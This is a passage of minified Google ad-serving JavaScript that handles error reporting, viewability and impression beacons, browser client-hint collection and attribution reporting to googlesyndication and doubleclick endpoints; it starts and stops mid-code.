      return encodeURIComponent(String(a));
    }
    function Pb(a, b) {
      var c = "https://pagead2.googlesyndication.com" + b,
        d = Qb(a) - b.length;
      if (0 > d) return "";
      a.g.sort(function (n, p) {
        return n - p;
      });
      b = null;
      for (var e = "", f = 0; f < a.g.length; f++) for (var g = a.g[f], h = a.h[g], k = 0; k < h.length; k++) {
        if (!d) {
          b = null == b ? g : b;
          break;
        }
        var l = Nb(h[k], a.i, ",$");
        if (l) {
          l = e + l;
          if (d >= l.length) {
            d -= l.length;
            c += l;
            e = a.i;
            break;
          }
          b = null == b ? g : b;
        }
      }
      a = "";
      null != b && (a = e + "trn=" + b);
      return c + a;
    }
    function Qb(a) {
      var b = 1,
        c;
      for (c in a.h) b = c.length > b ? c.length : b;
      return 3997 - b - a.i.length - 1;
    }
    ;
    function Rb() {
      var a = Sb;
      this.m = Tb;
      this.g = void 0 === a ? null : a;
      this.h = null;
      this.i = !1;
      this.o = this.j;
    }
    function Ub(a) {
      var b = Vb;
      try {
        if (b.g && b.g.g) {
          var c = b.g.start(903 .toString(), 3);
          var d = a();
          b.g.end(c);
        } else d = a();
      } catch (g) {
        a = !0;
        try {
          Kb(c), a = b.o(903, new zb(g, {
            message: Wb(g)
          }), void 0, void 0);
        } catch (h) {
          b.j(217, h);
        }
        if (a) {
          var e, f;
          null == (e = window.console) || null == (f = e.error) || f.call(e, g);
        } else throw g;
      }
      return d;
    }
    function Xb(a) {
      return function () {
        var b = pa.apply(0, arguments);
        return Ub(function () {
          return a.apply(void 0, b);
        });
      };
    }
    Rb.prototype.j = function (a, b, c, d, e) {
      e = e || "jserror";
      try {
        var f = new Lb();
        f.g.push(1);
        f.h[1] = Mb("context", a);
        b.error && b.meta && b.id || (b = new zb(b, {
          message: Wb(b)
        }));
        if (b.msg) {
          var g = b.msg.substring(0, 512);
          f.g.push(2);
          f.h[2] = Mb("msg", g);
        }
        var h = b.meta || {};
        if (this.h) try {
          this.h(h);
        } catch (ja) {}
        if (d) try {
          d(h);
        } catch (ja) {}
        b = [h];
        f.g.push(3);
        f.h[3] = b;
        d = x;
        b = [];
        g = null;
        do {
          var k = d;
          if (mb(k)) {
            var l = k.location.href;
            g = k.document && k.document.referrer || null;
          } else l = g, g = null;
          b.push(new Db(l || ""));
          try {
            d = k.parent;
          } catch (ja) {
            d = null;
          }
        } while (d && k != d);
        l = 0;
        for (var n = b.length - 1; l <= n; ++l) b[l].depth = n - l;
        k = x;
        if (k.location && k.location.ancestorOrigins && k.location.ancestorOrigins.length == b.length - 1) for (n = 1; n < b.length; ++n) {
          var p = b[n];
          p.url || (p.url = k.location.ancestorOrigins[n - 1] || "", p.R = !0);
        }
        var q = new Db(x.location.href, !1);
        k = null;
        var v = b.length - 1;
        for (p = v; 0 <= p; --p) {
          var t = b[p];
          !k && Bb.test(t.url) && (k = t);
          if (t.url && !t.R) {
            q = t;
            break;
          }
        }
        t = null;
        var y = b.length && b[v].url;
        0 != q.depth && y && (t = b[v]);
        var w = new Cb(q, t);
        if (w.h) {
          var r = w.h.url || "";
          f.g.push(4);
          f.h[4] = Mb("top", r);
        }
        var I = {
          url: w.g.url || ""
        };
        if (w.g.url) {
          var L = w.g.url.match(ib),
            C = L[1],
            D = L[3],
            ka = L[4];
          q = "";
          C && (q += C + ":");
          D && (q += "//", q += D, ka && (q += ":" + ka));
          var Ab = q;
        } else Ab = "";
        I = [I, {
          url: Ab
        }];
        f.g.push(5);
        f.h[5] = I;
        Yb(this.m, e, f, this.i, c);
      } catch (ja) {
        try {
          Yb(this.m, e, {
            context: "ecmserr",
            rctx: a,
            msg: Wb(ja),
            url: w && w.g.url
          }, this.i, c);
        } catch (id) {}
      }
      return !0;
    };
    function Wb(a) {
      var b = a.toString();
      a.name && -1 == b.indexOf(a.name) && (b += ": " + a.name);
      a.message && -1 == b.indexOf(a.message) && (b += ": " + a.message);
      if (a.stack) {
        a = a.stack;
        var c = b;
        try {
          -1 == a.indexOf(c) && (a = c + "\n" + a);
          for (var d; a != d;) d = a, a = a.replace(RegExp("((https?:/..*/)[^/:]*:\\d+(?:.|\n)*)\\2"), "$1");
          b = a.replace(RegExp("\n *", "g"), "\n");
        } catch (e) {
          b = c;
        }
      }
      return b;
    }
    ;
    function Zb(a) {
      var b = "J";
      if (a.J && a.hasOwnProperty(b)) return a.J;
      b = new a();
      return a.J = b;
    }
    ;
    function $b() {}
    ;
    function ac() {
      this.g = Math.random();
    }
    function bc() {
      var a = Tb,
        b = window.google_srt;
      0 <= b && 1 >= b && (a.g = b);
    }
    function Yb(a, b, c, d, e) {
      if (((void 0 === d ? 0 : d) ? a.g : Math.random()) < (e || .01)) try {
        if (c instanceof Lb) var f = c;else f = new Lb(), pb(c, function (h, k) {
          var l = f,
            n = l.j++;
          h = Mb(k, h);
          l.g.push(n);
          l.h[n] = h;
        });
        var g = Pb(f, "/pagead/gen_204?id=" + b + "&");
        g && U(g);
      } catch (h) {}
    }
    ;
    var Tb,
      Vb,
      Sb = new Jb();
    function cc() {
      if (!window.google_measure_js_timing) {
        var a = Sb;
        a.g = !1;
        a.h != a.i.google_js_reporting_queue && (X() && ya(a.h, Kb), a.h.length = 0);
      }
    }
    (function (a) {
      Tb = null != a ? a : new ac();
      "number" !== typeof window.google_srt && (window.google_srt = Math.random());
      bc();
      Vb = new Rb();
      Vb.h = function () {};
      Vb.i = !0;
      "complete" == window.document.readyState ? cc() : Sb.g && gb(window, "load", function () {
        cc();
      });
    })();
    var dc = ["FRAME", "IMG", "IFRAME"],
      ec = /^[01](px)?$/;
    function fc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function gc(a, b, c, d, e, f, g) {
      c = void 0 === c ? !0 : c;
      d = void 0 === d ? !1 : d;
      f = void 0 === f ? !1 : f;
      g = void 0 === g ? !1 : g;
      if (a = fc(a)) {
        e || (e = function (C, D, ka) {
          C.addEventListener(D, ka);
        });
        for (var h = !1, k = function (C) {
            h || (h = !0, b(C));
          }, l, n, p = 0; p < dc.length; ++p) if (dc[p] == a.tagName) {
          n = 3;
          l = [a];
          break;
        }
        l || (l = a.querySelectorAll(dc.join(",")), n = 2);
        var q = 0,
          v = 0,
          t = !g,
          y = a = !1;
        p = {};
        for (var w = 0; w < l.length; p = {
          v: p.v
        }, w++) {
          var r = l[w];
          if (!("IMG" == r.tagName && (r.complete && (!r.naturalWidth || !r.naturalHeight) || (void 0 === g ? 0 : g) && r.style && "none" === r.style.display) || ec.test(r.getAttribute("width")) && ec.test(r.getAttribute("height")))) {
            p.v = "IMG" === r.tagName;
            if ("IMG" == r.tagName) var I = r.naturalWidth && r.naturalHeight ? !0 : !1;else try {
              I = "complete" === (r.readyState ? r.readyState : r.contentWindow && r.contentWindow.document && r.contentWindow.document.readyState) ? !0 : !1;
            } catch (C) {
              I = void 0 === d ? !1 : d;
            }
            if (I) a = !0, p.v && (t = !0);else {
              q++;
              var L = function (C) {
                return function (D) {
                  q--;
                  !q && t && k(n);
                  C.v && (D = D && "error" === D.type, v--, D || (t = !0), !v && y && t && k(n));
                };
              }(p);
              e(r, "load", L);
              p.v && (v++, e(r, "error", L));
            }
          }
        }
        0 === v && (t = !0);
        l = null;
        if (0 === q && !a && "complete" === x.document.readyState) n = 5;else if (q || !a) {
          e(x, "load", function () {
            !f || !v && t ? k(4) : y = !0;
          });
          return;
        }
        c && k(n);
      }
    }
    ;
    function hc(a, b, c) {
      if (a) for (var d = 0; null != a && 500 > d && !c(a); ++d) a = b(a);
    }
    function ic(a, b) {
      hc(a, function (c) {
        try {
          return c === c.parent ? null : c.parent;
        } catch (d) {}
        return null;
      }, b);
    }
    function jc(a, b) {
      if ("IFRAME" == a.tagName) b(a);else {
        a = a.querySelectorAll("IFRAME");
        for (var c = 0; c < a.length && !b(a[c]); ++c);
      }
    }
    function kc(a) {
      return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
    }
    function lc(a, b, c) {
      try {
        var d = JSON.parse(c.data);
      } catch (g) {}
      if ("object" === typeof d && d && "creativeLoad" === d.type) {
        var e = kc(a);
        if (c.source && e) {
          var f;
          ic(c.source, function (g) {
            try {
              if (g.parent === e) return f = g, !0;
            } catch (h) {}
          });
          f && jc(a, function (g) {
            if (g.contentWindow === f) return b(d), !0;
          });
        }
      }
    }
    function mc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function nc(a, b) {
      var c = mc(a);
      if (c) if (c.onCreativeLoad) c.onCreativeLoad(b);else {
        var d = b ? [b] : [],
          e = function (f) {
            for (var g = 0; g < d.length; ++g) try {
              d[g](1, f);
            } catch (h) {}
            d = {
              push: function (h) {
                h(1, f);
              }
            };
          };
        c.onCreativeLoad = function (f) {
          d.push(f);
        };
        c.setAttribute("data-creative-load-listener", "");
        c.addEventListener("creativeLoad", function (f) {
          e(f.detail);
        });
        x.addEventListener("message", function (f) {
          lc(c, e, f);
        });
      }
    }
    ;
    function Y(a) {
      var b = this;
      this.h = !1;
      this.g = [];
      a(function (c) {
        oc(b, c);
      });
    }
    function oc(a, b) {
      if (!a.h) if (b instanceof Y) b.then(function (c) {
        oc(a, c);
      });else {
        a.h = !0;
        a.i = b;
        for (b = 0; b < a.g.length; ++b) pc(a, a.g[b]);
        a.g = [];
      }
    }
    function pc(a, b) {
      a.h ? b(a.i) : a.g.push(b);
    }
    Y.prototype.then = function (a) {
      var b = this;
      return new Y(function (c) {
        pc(b, function (d) {
          c(a(d));
        });
      });
    };
    function qc(a) {
      var b = a.length,
        c = 0;
      return new Y(function (d) {
        if (0 == b) d([]);else for (var e = [], f = {
            s: 0
          }; f.s < b; f = {
          s: f.s
        }, ++f.s) a[f.s].then(function (g) {
          return function (h) {
            e[g.s] = h;
            ++c == b && d(e);
          };
        }(f));
      });
    }
    function rc() {
      var a,
        b = new Y(function (c) {
          a = c;
        });
      return new sc(b, a);
    }
    function sc(a, b) {
      this.promise = a;
      this.resolve = b;
    }
    ;
    function tc(a) {
      return a.prerendering ? 3 : {
        visible: 1,
        hidden: 2,
        prerender: 3,
        preview: 4,
        unloaded: 5
      }[a.visibilityState || a.webkitVisibilityState || a.mozVisibilityState || ""] || 0;
    }
    function uc(a) {
      var b;
      a.visibilityState ? b = "visibilitychange" : a.mozVisibilityState ? b = "mozvisibilitychange" : a.webkitVisibilityState && (b = "webkitvisibilitychange");
      return b;
    }
    ;
    function vc(a, b, c) {
      function d(k) {
        try {
          var l = "object" === typeof k.data ? k.data : JSON.parse(k.data);
          g === l.paw_id && (window.clearTimeout(h), window.removeEventListener("message", d), l.signal ? b(l.signal) : l.error && c(l.error));
        } catch (n) {
          k = {
            msg: "postmessageError",
            err: n instanceof Error ? n.message : "nonError",
            data: null == k.data ? "null" : 500 < k.data.length ? k.data.substring(0, 500) : k.data
          }, Zb($b), l = [], !k.eid && l.length && (k.eid = l.toString()), Yb(Tb, "paw_sigs", k, !0);
        }
      }
      var e = {},
        f = 200;
      e = void 0 === e ? {} : e;
      b = void 0 === b ? function () {} : b;
      c = void 0 === c ? function () {} : c;
      f = void 0 === f ? 200 : f;
      var g = String(Math.floor(2147483647 * ob())),
        h = 0;
      window.addEventListener("message", function (k) {
        Xb(function () {
          d(k);
        })();
      });
      a.postMessage(Object.assign({}, {
        paw_id: g
      }, e));
      h = window.setTimeout(function () {
        window.removeEventListener("message", d);
        c("PAW GMA postmessage timed out.");
      }, f);
    }
    function wc() {
      var a = window,
        b,
        c;
      if (a.gmaSdk || (null == (b = a.webkit) ? 0 : null == (c = b.messageHandlers) ? 0 : c.getGmaViewSignals)) return a;
      try {
        var d = window.parent,
          e,
          f;
        if (d.gmaSdk || (null == (e = d.webkit) ? 0 : null == (f = e.messageHandlers) ? 0 : f.getGmaViewSignals)) return d;
      } catch (g) {}
      return null;
    }
    ;
    function xc(a) {
      this.l = P(a);
    }
    u(xc, R);
    function yc(a) {
      this.l = P(a);
    }
    u(yc, R);
    function zc(a, b) {
      return Q(a, 2, b);
    }
    function Ac(a, b) {
      return Q(a, 3, b);
    }
    function Bc(a, b) {
      return Q(a, 4, b);
    }
    function Cc(a, b) {
      return Q(a, 5, b);
    }
    function Dc(a, b) {
      return Q(a, 9, b);
    }
    function Ec(a, b) {
      var c = b;
      b = a.l;
      var d = M(b);
      if (d & 2) throw Error();
      if (null != c) {
        for (var e = !!c.length, f = 0; f < c.length; f++) {
          var g = c[f];
          e = e && !(J(g.l) & 2);
        }
        g = J(c);
        f = g | 1;
        f = (e ? f | 8 : f & -9) | 4;
        f != g && (Object.isFrozen(c) && (c = Array.prototype.slice.call(c)), K(c, f));
      }
      null == c && (c = void 0);
      Va(b, d, 10, c);
      return a;
    }
    function Fc(a, b) {
      return Ua(a, 11, null == b ? b : Ma(b));
    }
    function Gc(a, b) {
      return Q(a, 1, b);
    }
    function Hc(a, b) {
      return Ua(a, 7, null == b ? b : Ma(b));
    }
    yc.aa = [10, 6];
    var Ic = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
    function Jc(a) {
      var b;
      return null != (b = a.google_tag_data) ? b : a.google_tag_data = {};
    }
    function Kc(a) {
      var b, c;
      return "function" === typeof (null == (b = a.navigator) ? void 0 : null == (c = b.userAgentData) ? void 0 : c.getHighEntropyValues);
    }
    function Lc(a) {
      if (!Kc(a)) return null;
      var b = Jc(a);
      if (b.uach_promise) return b.uach_promise;
      a = a.navigator.userAgentData.getHighEntropyValues(Ic).then(function (c) {
        null != b.uach || (b.uach = c);
        return c;
      });
      return b.uach_promise = a;
    }
    function Mc(a) {
      var b;
      return Fc(Ec(Cc(zc(Gc(Bc(Hc(Dc(Ac(new yc(), a.architecture || ""), a.bitness || ""), a.mobile || !1), a.model || ""), a.platform || ""), a.platformVersion || ""), a.uaFullVersion || ""), (null == (b = a.fullVersionList) ? void 0 : b.map(function (c) {
        var d = new xc();
        d = Q(d, 1, c.brand);
        return Q(d, 2, c.version);
      })) || []), a.wow64 || !1);
    }
    function Nc(a) {
      var b, c;
      return null != (c = null == (b = Lc(a)) ? void 0 : b.then(function (d) {
        return Mc(d);
      })) ? c : null;
    }
    ;
    function Oc(a) {
      return ["omid_v1_present", "omid_v1_present_web", "omid_v1_present_app"].some(function (b) {
        try {
          var c = a.frames && !!a.frames[b];
        } catch (d) {
          c = !1;
        }
        return c;
      });
    }
    ;
    function Pc() {
      this.g = x.document;
      this.u = x;
      this.h = null;
      this.i = this.j = "";
      this.m = Qc();
      Rc(this);
    }
    function Rc(a) {
      var b = [],
        c = V(bb) || !!T.aub;
      if (c || T.aunb) {
        var d = Nc(a.u);
        d && (d = d.then(function (p) {
          p = Xa(p);
          for (var q = [], v = 0, t = 0; t < p.length; t++) {
            var y = p.charCodeAt(t);
            255 < y && (q[v++] = y & 255, y >>= 8);
            q[v++] = y;
          }
          p = Ca(q, 3);
          a.j = p;
        }), c && b.push(d));
      }
      if (V(ab) || V(cb)) {
        c = wc();
        var e;
        if (null == c ? 0 : null == (e = c.gmaSdk) ? 0 : e.getViewSignals) (e = c.gmaSdk.getViewSignals()) && !V(cb) && (a.i = "&ms=" + e);else {
          var f, g;
          if (null == c ? 0 : null == (f = c.webkit) ? 0 : null == (g = f.messageHandlers) ? 0 : g.getGmaViewSignals) {
            var h, k;
            vc(null == c ? void 0 : null == (h = c.webkit) ? void 0 : null == (k = h.messageHandlers) ? void 0 : k.getGmaViewSignals, function (p) {
              V(cb) || (a.i = "&" + p);
            }, function () {});
          }
        }
      }
      T.umi && (e = new Y(function (p) {
        a.h = p;
      }), b.push(e));
      if (T.ebrpfa || V($a)) {
        var l = rc();
        b.push(l.promise);
        sb(a.g, function () {
          gc(a.g.body, l.resolve);
        });
      }
      3 == tc(a.g) && 3 == tc(a.g) && b.push(Sc(a));
      if (T.opxdv && a.m) {
        var n = rc();
        b.push(n.promise);
        e = x.omrhp;
        "function" === typeof e ? e(n.resolve) : (e = x.document.querySelector("script[data-jc='86']")) && e.addEventListener("load", function () {
          x.omrhp(n.resolve);
        });
      }
      a.o = qc(b);
    }
    function Tc(a) {
      var b = a.search(kb);
      var c = jb(a, 0, "ase", b);
      if (0 > c) b = null;else {
        var d = a.indexOf("&", c);
        if (0 > d || d > b) d = b;
        b = decodeURIComponent(a.slice(c + 4, -1 !== d ? d : 0).replace(/\+/g, " "));
      }
      if (b === 2 .toString()) {
        var e = x.document;
        e = void 0 === e ? document : e;
        var f;
        e = null != (f = e.featurePolicy) && f.allowedFeatures().includes("attribution-reporting") ? 6 : 5;
        f = a.search(kb);
        b = 0;
        for (d = []; 0 <= (c = jb(a, b, "nis", f));) d.push(a.substring(b, c)), b = Math.min(a.indexOf("&", c) + 1 || f, f);
        d.push(a.slice(b));
        d.join("").replace(lb, "$1");
        null != e && encodeURIComponent(String(e));
        e = !1;
        f = !0;
        e = void 0 === e ? !1 : e;
        f = void 0 === f ? !1 : f;
        x.fetch ? (e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        }, f && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        }), x.fetch(a, e)) : U(a, void 0, e, f);
      } else if (T.atsb) {
        e = void 0 === e ? !1 : e;
        if (f = x.navigator) f = x.navigator.userAgent, f = /Chrome/.test(f) && !/Edge/.test(f) ? !0 : !1;
        f && x.navigator.sendBeacon ? x.navigator.sendBeacon(a) : U(a, void 0, e);
      } else U(a);
    }
    function Qc() {
      var a = S(x).omid3p,
        b = !!a && "function" === typeof a.registerSessionObserver && "function" === typeof a.addEventListener;
      b || nb(function (c) {
        Oc(c) && (b = !0);
        return b;
      }, !0);
      return b;
    }
    function Sc(a) {
      return new Y(function (b) {
        var c = uc(a.g);
        if (c) {
          var d = function () {
            3 != tc(a.g) && (hb(a.g, c, d), b());
          };
          gb(a.g, c, d);
        }
      });
    }
    ;
    function Z() {
      return new Date().getTime();
    }
    function Uc() {
      try {
        var a = void 0 === a ? document : a;
        var b;
        return !(null == (b = a.featurePolicy) || !b.features().includes("attribution-reporting"));
      } catch (c) {
        return !1;
      }
    }
    function Vc(a) {
      var b = a.querySelector('a img[alt="Advertisement"]');
      return b && /^img_anch_/.test(b.parentElement.id) ? b : a;
    }
    function Wc(a, b) {
      this.I = a;
      this.u = this.i = this.g = !1;
      this.O = 1;
      this.m = T.eavp ? 1 : 0;
      this.h = T.ebrp ? 1 : 0;
      this.W = !!T.opxb;
      this.D = this.A = null;
      this.H = rc();
      this.N = Z();
      this.M = null;
      this.T = .001 > Math.random();
      this.P = T.eeid || "";
      this.C = this.o = null;
      this.U = (Math.random() + "").slice(-5);
      this.j = !1;
      this.B = null;
      this.K = 0;
      this.F = this.G = null;
      this.V = !!T.fld;
      this.S = T.adsg || "";
      this.Y = !!T.uffp;
      this.X = !!T.espa;
      if (a = !!T.aifbl) {
        var c, d;
        a = -1 != (null == (c = x.navigator) ? void 0 : null == (d = c.userAgent) ? void 0 : d.indexOf("Firefox"));
      }
      this.L = a;
      Xc(this, b);
    }
    var Yc;
    function Zc(a, b) {
      b && 0 !== a.h && (a.C = Z() - a.N, a.L && (b = Vc(b)), $c(a, b).then(function (c) {
        c && (a.A = c);
        a.u = !0;
        ad(a);
      }));
    }
    function bd() {
      try {
        nb(function (a) {
          a = a.document;
          if (db.length && a.head) for (var b = ea(db), c = b.next(); !c.done; c = b.next()) if ((c = c.value) && a.head) {
            var d = tb("META");
            a.head.appendChild(d);
            d.httpEquiv = "origin-trial";
            d.content = c;
          }
          return !1;
        }, !1);
      } catch (a) {}
    }
    function Xc(a, b) {
      Zc(a, b);
      bd();
      0 !== a.h || 0 !== a.m ? cd(a) ? dd(a).then(function () {
        ed(a);
      }) : ed(a) : a.B = 1;
      Zb(Pc).o.then(function () {
        a.g = !0;
        ad(a);
      });
      fd(a);
      ad(a);
    }
    function $c(a, b) {
      return new Y(function (c) {
        function d(e, f) {
          a.D = e;
          c(f);
        }
        nc(b, d);
        gc(b, d, !0, !1, void 0, !0, a.L);
      });
    }
    function cd(a) {
      a.j = Qc();
      a.B = a.j ? 4 : 1;
      return a.j;
    }
    function dd(a) {
      return new Y(function (b) {
        function c(e) {
          a.B = 3;
          e && (a.G = e.src, a.F = e.sdk);
          b();
        }
        var d = x.omrhp;
        "function" === typeof d ? d(c) : (d = x.document.querySelector("script[data-jc='86']")) && d.addEventListener("load", function () {
          x.omrhp(c);
        });
      });
    }
    function ed(a) {
      a.i = !0;
      ad(a);
    }
    function ad(a) {
      if (a.g) {
        var b = null,
          c = 0;
        2 !== a.O ? b = 0 : 1 === a.m && a.g && a.i ? b = 12 : 1 === a.h && a.g && a.i && a.u && (b = 11);
        if (null != b) a: {
          if (0 === b ? 1 === a.h && a.g && a.i && a.u ? c = 2 : 1 === a.m && a.g && a.i && (c = 1) : 12 === b && 1 === a.h && a.g && a.i && a.u && (c = 2), a.W && (a.T && "" !== a.I && a.j && (a.o || 0 !== b || gd(a, !0), 12 !== b && 1 !== c && 2 !== c || gd(a, !1)), 0 === b && 0 === c)) break a;
          var d = Z(),
            e = hd(a, b, c, d);
          0 === b && (a.O = 2, a.M = d);
          if (12 === b || c) a.m = 2;
          if (11 === b || 2 === c) a.h = 2;
          if (a.V) {
            e = new Ya();
            Q(e, 1, a.S);
            e = Xa(e);
            if (0 === b) {
              d = S(x);
              var f;
              null == d || null == (f = d.fence) || f.reportEvent({
                eventType: "impression",
                eventData: e,
                destination: ["buyer"]
              });
              var g;
              null == d || null == (g = d.fence) || g.reportEvent({
                eventType: "impression",
                destination: ["component-seller"]
              });
            }
            if (11 === b || 2 === c) {
              var h, k;
              null == (h = S(x)) || null == (k = h.fence) || k.reportEvent({
                eventType: "b2rimpression",
                eventData: e,
                destination: ["buyer"]
              });
            }
          } else e && (((f = a.X && Uc()) || a.Y) && x.fetch ? (g = {
            method: "GET",
            keepalive: !0
          }, f ? "setAttributionReporting" in XMLHttpRequest.prototype ? g.attributionReporting = {
            eventSourceEligible: !0,
            triggerEligible: !1
          } : g.headers = {
            "Attribution-Reporting-Eligible": "event-source"
          } : g.mode = "no-cors", x.fetch(eb(e, "&ftch=1"), g)) : Tc(e));
          0 === b && a.H.resolve();
        }
      }
    }
    function gd(a, b) {
      var c = null;
      b ? a.o = Z() : c = a.o ? Z() - a.o : "?";
      a = "https://pagead2.googlesyndication.com/pagead/gen_204?id=opxhb&evt=" + (b ? "d" : "o") + ("&eid=" + encodeURIComponent(a.P)) + (null == c ? "" : "&ttp=" + c);
      Tc(a);
    }
    function hd(a, b, c, d) {
      if ("" === a.I) return null;
      var e = {
        omid: a.j ? 1 : 0,
        rm: a.B,
        ctpt: d - a.N
      };
      0 !== b && (e.vt = b, e.dtpt = d - (a.M || 0));
      0 !== c && (e.cbvp = c);
      a.D && (e.dett = a.D);
      a.A && (e.beid = a.A.eventId, e.vend = a.A.vendor);
      null != a.C && (e.cstd = a.C);
      (b = T.bvst) && (e.cisv = b + ("." + a.U));
      0 !== a.K && (e.vwbs = a.K);
      a.G && (e.oprs = a.G);
      a.F && (e.opsd = a.F);
      (b = Zb(Pc).j) && (e.uach = b);
      e.arae = Number(Uc());
      var f = "";
      pb(e, function (g, h) {
        f += "&" + h + "=" + encodeURIComponent(g);
      });
      return eb(a.I, f);
    }
    function fd(a) {
      var b = a.P;
      if (b && (b = x["bllsn" + b], "function" === typeof b)) try {
        b(function (c) {
          c && (a.K = c.block ? 2 : 1);
        });
      } catch (c) {}
    }
    ;
    S().btrp = function (a, b) {
      var c = Yc = new Wc(a, b);
      return function (d) {
        Zc(c, d);
      };
    };
    S().pdib3 = function (a, b) {
      Yc.H.promise.then(function () {
        if (b) {
          var c = void 0 === c ? !1 : c;
          if (vb()) ub(window, a, null, !0, c);else {
            var d = x.document;
            if (d.body) {
              var e = d.getElementById("goog-srcless-iframe");
              e || (e = tb("IFRAME"), e.style.display = "none", e.id = "goog-srcless-iframe", d.body.appendChild(e));
              d = e;
            } else d = null;
            d && d.contentWindow && ub(d.contentWindow, a, null, !0, c);
          }
        } else U(a);
      });
    };
    S().vv = function () {
      var a = Zb(Pc);
      if (!a.h) throw Error("aiv::err");
      a.h();
    };
    S().sasrc = function (a) {
      Yc.H.promise.then(function () {
        var b = x.document.createElement("img");
        b.style.display = "none";
        b.attributionSrc = a;
        x.document.body.appendChild(b);
      });
    };
  }).call(this);
  window.stcc = btrp("https://googleads4.g.doubleclick.net/pcs/view?xai\x3dAKAOjssvDRcPMoaLqNNuo0KSN3ankgluqIoOwzE7nwQzTgcuZtnve_RKHmVW1W_okw15yB01kgjkkq_7QdeZbaEFHD0Q80Z-RZCvfo_XpLw2K_SImALrcup40YxBsXwuExChTBI4xjKL_iwMj5UV_z0Lgu77m4P1_btbXuFkm9GTEQdHq0Ir5qxcxdDXt0qfNPkWrEPJ6D0SMjPUo29PMP-PyKLrVQ5oWks3ufHnHMpv03ZmigwGkaEkL5wN7SBV1fuqQRT6V6sAsL4jqMJzrdjKW-AKJhLVASHkgt9c2XYTGEjtnUIaxV9Th2FpSvOqQsMxwgrfWtXC_dqCoycHE8sFc1QjP18gHO10GmakjeuZssE8Wzm8pSq-JFTpkAI1RPLFM3wjnSfh0qWLx_i9pY6GYp_-4YiG7QG-7wawQpVbFP14gNA9YSK-2pWP1bIDEKWTI7q6fS8N4vWYW92X1oVO17oeSeuXU0lnAc3BGDm41TUxGkEVYJsNzQwG87kEyFmiO7LlJ18laAgvQRftgqJm5n--0cC7iXvjpurfyf0Li_uwHK2gjxe6Apq3T9ywhmTR3sLtkXq3asnjlab2HsR7sI0JK5xveMNclYYMyS-rni1BlOKMt1oSkTp5C6HRDTjS7iPdaeRrUBuumHYdkGqzyjzb4-uboxiVAB-hBwUPX2F8WPRV_zhKaDMWhYS9h164nTqT_jOwrNc1mo0fXacs4VXqGdFJDy6k9dZsvBLDf4UggcqYhYeQBA-42-Wclx1B9QbMJ6JR9jsIylVC0chLwYubLhRhe0GXsfQpwBSShYA01YXd7-UjMXP39K-SDfDS8m-gi_po1GtsFGGxe6hge4FoPd4aEZMzvQI-sHRP16DM-rqVM_HHd-cV9s-AVdiUFexPQg8rYC4akhIVXM7SBgr6S2dzzXL69jEiKwH_YMuRhB39WbEFc4YYSZB7DQ69eOQeZ5o88LxUldiN44QHRzMNZLtFE0901QFQU2pSkRMd7oOTleX4QinIExxA_EoaiFPRY4ntgndt9pok3EEPgxbAQvqTMLB0cZnk124BSoiCc62LpmWxgP2ygpZGRG0oL7UsF9onwFDVu2aAQWsdUYv0DR77Mjiac3HSm8xI3kepfAG1WwsU5u-7gdQwHub7JWKFjglCg4KQk_SsegysXbXQlC3xfFjfvIcBeqIOW8jwfc1J9KgZGYSwTSxyBIkVRVAy-S55aC3K4oZsDmZDdlPMrkQR-CqZrIclIoVv50KlqfcbVYsdcxb_OHdT41oJW4z2Q_9mtqAaTayyFo7D8yUovEUol-MoH0NjxmB2835Rkj907Kxw0uxWZyauEcZ_BFXqFZ5TQiXVEJgNqST6qKAC9PuyzMvRrFjO_no\x26sai\x3dAMfl-YQjzaXK8fOnhjBadUnqdg9-8SlbcfxtG9q7IhH5oPV6SDR5r1QIrziY8ZrTzFqt7IrlWnvQDPdom_iDv4ld7MH3UaKhdppmr-WbsDRbDTvjXZp9iqSF43CXU9nDLYDSbzidrL6c-3Z-CIIAMmD09nUJsxJJ1rjoyuThRUrp8aXf-lGIuU9DHqdL4KDXl4AkyaRqo0j-rUr-tHJm9f9Co6fDaLqwAmXukKzmDB861LqRCXeHNXYtFukJO263vGhkBJ2RTTY\x26sig\x3dCg0ArKJSzAWb1AbZCcdMEAE\x26uach_m\x3d[UACH]\x26fbs_aeid\x3d[gw_fbsaeid]\x26urlfix\x3d1\x26adurl\x3d", document.getElementById("gcc_vM_gZNyxL4za2ATvvpAg"));
})();
(function () {
  if (!window.GoogleTyFxhY || typeof window.GoogleTyFxhY.push !== 'function') {
    window.GoogleTyFxhY = [];
  }
  window.GoogleTyFxhY.push({
    '_scs_': 'BK8H-vM_gZNyxL4za2ATvvpAgAAAAADgB4AQC',
    '_bgu_': 'https://pagead2.googlesyndication.com/bg/VOYjWJ9SYKUWeq_SiXQPiq5A6-bg1q_inShFnttaRxg.js',
